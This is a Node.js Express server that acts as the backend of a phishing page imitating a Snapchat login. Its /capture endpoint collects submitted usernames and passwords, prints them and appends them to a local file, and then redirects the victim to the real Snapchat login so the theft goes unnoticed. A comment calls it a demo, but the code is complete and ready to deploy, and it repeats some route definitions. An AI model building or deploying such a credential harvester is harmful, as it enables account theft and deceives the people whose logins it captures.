const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();

// 1. Middleware (MUST come before routes and app.listen)
app.use(express.static(__dirname)); // Serves static files (like snapchat-logo.png) from root
app.use(cors()); // Allows frontend to make cross-origin requests
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// 2. Define your API routes or file routes here
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// 3. Start listening (for local testing & traditional servers like Render)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

// 4. Export app for Vercel Serverless Functions
module.exports = app;
// 1. Health Check Route (To test if the server is alive)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// 2. The Capture Endpoint
app.post('/capture', (req, res) => {
    const { username, password } = req.body;

    // Log to terminal for immediate visibility
    console.log("\n--- [!] DATA CAPTURED ---");
    console.log(`Timestamp: ${new Date().toISOString()}`);
    console.log(`Username: ${username}`);
    console.log(`Password: ${password}`);
    console.log("-------------------------\n");

    // Log to local file
    const logEntry = `[${new Date().toISOString()}] User: ${username} | Pass: ${password}\n`;
    
    fs.appendFile('captured_data.txt', logEntry, (err) => {
        if (err) console.error("Error writing to log file:", err);
    });

    // Redirect to real site to hide the attack
    // In a real demo, this makes the user think the session just expired.
    res.redirect('https://accounts.snapchat.com/v2/login');
});

